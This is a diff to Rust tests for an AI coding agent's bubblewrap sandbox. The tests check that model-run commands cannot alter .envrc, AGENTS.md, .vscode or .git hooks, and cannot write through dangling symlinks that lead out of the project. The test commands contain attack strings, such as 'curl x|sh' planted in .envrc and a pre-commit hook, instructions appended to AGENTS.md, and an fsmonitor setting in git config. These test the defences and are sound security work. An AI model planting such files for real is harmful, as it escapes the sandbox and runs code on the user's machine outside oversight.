@@ -107,8 +107,12 @@ fn the_home_is_a_stand_in_with_masked_credentials() {
 /// confined) can change source files but not `.git` (hooks run outside the sandbox on the next commit) nor a
 /// top-level protected file.
 ///
+/// Existing protected files are read-only at any level (`packages/a/AGENTS.md`, `apps/web/.vscode/`), not just at
+/// the top.
+///
 /// Proven: dropped the protected `--ro-bind`s in `sandbox_args` → failed (`.envrc` changed); made `git_guard` return
-/// no mounts → failed (a hook planted).
+/// no mounts → failed (a hook planted); made `protected_mounts` stop below the top level → failed (the nested
+/// `AGENTS.md` changed).
 #[test]
 fn the_project_is_writable_but_git_and_protected_paths_are_read_only() {
     require_bwrap!();
@@ -119,6 +123,8 @@ fn the_project_is_writable_but_git_and_protected_paths_are_read_only() {
         ("AGENTS.md", "rules\n"),
         ("bunfig.toml", ""),
         (".vscode/tasks.json", "{}"),
+        ("packages/a/AGENTS.md", "nested rules\n"),
+        ("apps/web/.vscode/tasks.json", "{}"),
     ] {
         project.write(rel, text);
     }
@@ -130,7 +136,8 @@ fn the_project_is_writable_but_git_and_protected_paths_are_read_only() {
         project.path(),
         &mounts,
         "echo 'curl x|sh' >> .envrc; echo obey >> AGENTS.md; echo 'preload=[\"x\"]' >> bunfig.toml; \
-         echo '{\"tasks\":1}' > .vscode/tasks.json; echo evil > .git/hooks/pre-commit; echo ok > src.txt",
+         echo '{\"tasks\":1}' > .vscode/tasks.json; echo evil > .git/hooks/pre-commit; echo obey >> packages/a/AGENTS.md; \
+         echo '{\"tasks\":1}' > apps/web/.vscode/tasks.json; echo x > apps/web/.vscode/launch.json; echo ok > src.txt",
         &[],
     );
     assert_eq!(project.read(".envrc").unwrap(), "use flake\n", "{}", ran.output);
@@ -138,14 +145,19 @@ fn the_project_is_writable_but_git_and_protected_paths_are_read_only() {
     assert_eq!(project.read("bunfig.toml").unwrap(), "");
     assert_eq!(project.read(".vscode/tasks.json").unwrap(), "{}");
     assert!(project.read(".git/hooks/pre-commit").is_none());
+    assert_eq!(project.read("packages/a/AGENTS.md").unwrap(), "nested rules\n");
+    assert_eq!(project.read("apps/web/.vscode/tasks.json").unwrap(), "{}");
+    assert!(project.read("apps/web/.vscode/launch.json").is_none());
     assert_eq!(project.read("src.txt").unwrap(), "ok\n");
 }
 
 /// **Protected files a command creates** (bwrap can only mount what exists): a new `.envrc`, a nested `AGENTS.md`,
 /// a nested `.git` are found after the command by `protected::scan_created` and removed by `revert_created`.
 ///
+/// A `.envrc` planted at any depth outside the skipped folders (`node_modules`, `target`, `.git`) is caught.
+///
 /// Proven: made `scan_created` skip entries not in `before` (returned nothing) → failed; made `revert_created` a no-op
-/// → failed (`.envrc` still there).
+/// → failed (`.envrc` still there); added `"a"` to `SKIPPED_DIRS` → failed (the deep `.envrc` missed).
 #[test]
 fn protected_files_a_command_creates_are_found_and_reverted() {
     require_bwrap!();
@@ -157,7 +169,8 @@ fn protected_files_a_command_creates_are_found_and_reverted() {
         project.path(),
         &CommandMounts::default(),
         "echo 'curl x|sh' > .envrc && mkdir -p packages/a/.git && echo obey > packages/a/AGENTS.md && \
-         echo '[core] fsmonitor = evil' > packages/a/.git/config && echo ok > src.txt",
+         echo '[core] fsmonitor = evil' > packages/a/.git/config && mkdir -p a/b/c/d/e/f && echo x > a/b/c/d/e/f/.envrc && \
+         mkdir -p node_modules/p && echo x > node_modules/p/.envrc && echo ok > src.txt",
         &[],
     );
     assert_eq!(ran.code, Some(0), "{}", ran.output);
@@ -167,23 +180,24 @@ fn protected_files_a_command_creates_are_found_and_reverted() {
         found,
         [
             (".envrc", ProtectedRule::Envrc),
+            ("a/b/c/d/e/f/.envrc", ProtectedRule::Envrc),
             ("packages/a/.git", ProtectedRule::GitDir),
             ("packages/a/AGENTS.md", ProtectedRule::AgentInstructions)
         ]
     );
     revert_created(project.path(), &mut created);
-    for gone in [".envrc", "packages/a/AGENTS.md", "packages/a/.git"] {
+    for gone in [".envrc", "a/b/c/d/e/f/.envrc", "packages/a/AGENTS.md", "packages/a/.git"] {
         assert!(!project.path().join(gone).exists(), "{gone} still there");
     }
     assert_eq!(project.read("src.txt").unwrap(), "ok\n");
     assert!(created_note(&created).unwrap().contains(".envrc (direnv runs it in your shell)"));
 }
 
-/// The same rule through the `bash` tool: a yolo command that plants `.envrc` leaves nothing behind, and the model
-/// is told. Bash's `run` (#4) doesn't call the scan yet; marv-tools needs `protected_snapshot` before `run_command`
-/// and `scan_created` + `revert_created` + `created_note` after the placeholders are removed.
+/// The same rule through the `bash` tool: a yolo command that plants `.envrc` and a nested `AGENTS.md` leaves
+/// nothing behind, and the model is told.
+///
+/// Proven: removed the `scan_created`/`revert_created` block from bash's `run` → failed (`.envrc` still there).
 #[tokio::test]
-#[ignore = "needs bash run to call protected::scan_created (marv-tools, follow-up to #4)"]
 async fn bash_reverts_protected_files_its_command_created() {
     require_bwrap!();
     let project = TempDir::new("bash-created");
@@ -207,7 +221,8 @@ async fn bash_reverts_protected_files_its_command_created() {
 /// control).
 ///
 /// Proven: made `run_tool` compute `must_ask` without `protected.is_some()` → failed (written in yolo, no ask);
-/// removed `.envrc` (and in turn `agents.md`, `.marv`) from `rule_for_relative` → failed for that path.
+/// removed `.envrc` (and in turn `agents.md`, `.marv`) from `rule_for_relative` → failed for that path; made
+/// `real_with_missing` treat a dangling symlink as missing → failed (`innocent.sh -> .envrc` didn't ask).
 #[tokio::test]
 async fn protected_paths_ask_even_in_yolo() {
     let project = TempDir::new("ask");
@@ -334,7 +349,7 @@ fn secrets_are_masked_in_the_sandbox() {
 /// **Every path is checked after `realpath`; no tool follows a symlink out of its root.** A project symlink to a file
 /// outside, a new file in a symlinked folder, and `read_file` through such a link are all refused.
 ///
-/// Proven: made `resolve_in_project` skip the `canonicalize` check (lexical only) → failed.
+/// Proven: made `resolve_in_project` skip its realpath containment check (lexical only) → failed.
 #[tokio::test]
 async fn no_tool_follows_a_symlink_out_of_the_project() {
     let (project, outside) = (TempDir::new("real"), TempDir::new("real-out"));
@@ -354,12 +369,13 @@ async fn no_tool_follows_a_symlink_out_of_the_project() {
     assert!(!outside.path().join("new.txt").exists());
 }
 
-/// A dangling symlink leading out of the project: a write through it creates the file outside. Found by this suite:
-/// `resolve_in_project` checks the nearest *existing* ancestor (`nearest_existing` follows symlinks, so a dangling
-/// link reads as missing) and the link itself is never resolved; `write_file` then wrote `/outside/planted.sh`. The
-/// same gap in `protected_rule` is fixed (`protected::leads_to`); `paths.rs` isn't this issue's file.
+/// **…including a dangling symlink**: a write through `out.sh -> /elsewhere/planted.sh` creates the target. Found by
+/// this suite: `resolve_in_project` checked the nearest *existing* ancestor, and `write_file` wrote outside the
+/// project. A dangling link into `.git` is refused too.
+///
+/// Proven: made `real_with_missing` treat a dangling symlink as a missing file (Marv's behaviour) → failed
+/// (`planted.sh` written); removed the dangling-into-`.git` refusal → failed (the hook written).
 #[tokio::test]
-#[ignore = "needs resolve_in_project to follow a dangling final symlink (marv-sandbox paths.rs; found by #8)"]
 async fn no_write_through_a_dangling_symlink_out_of_the_project() {
     let (project, outside) = (TempDir::new("dangle"), TempDir::new("dangle-out"));
     std::os::unix::fs::symlink(outside.path().join("planted.sh"), project.path().join("out.sh")).unwrap();
@@ -368,6 +384,14 @@ async fn no_write_through_a_dangling_symlink_out_of_the_project() {
     let write = run_tool(&call("write_file", json!({"path": "out.sh", "content": "x"})), &ctx, builtin_tools()).await;
     assert!(write.result.is_error, "{}", write.result.output);
     assert!(!outside.path().join("planted.sh").exists());
+    // Into .git, even in yolo with a yes: refused, nothing written.
+    project.write(".git/HEAD", "ref: refs/heads/main\n");
+    std::fs::create_dir_all(project.path().join(".git/hooks")).unwrap();
+    std::os::unix::fs::symlink(project.path().join(".git/hooks/pre-commit"), project.path().join("hook.sh")).unwrap();
+    let ctx = ToolContext { yolo: true, approver: Some(Recorder::new(Decision::Yes)), ..ToolContext::new(project.path()) };
+    let hook = run_tool(&call("write_file", json!({"path": "hook.sh", "content": "curl x | sh"})), &ctx, builtin_tools()).await;
+    assert!(hook.result.is_error, "{}", hook.result.output);
+    assert!(!project.path().join(".git/hooks/pre-commit").exists());
 }
 
 /// **That includes skill files**, which Marv 0.3.0 read outside the sandbox through a symlink
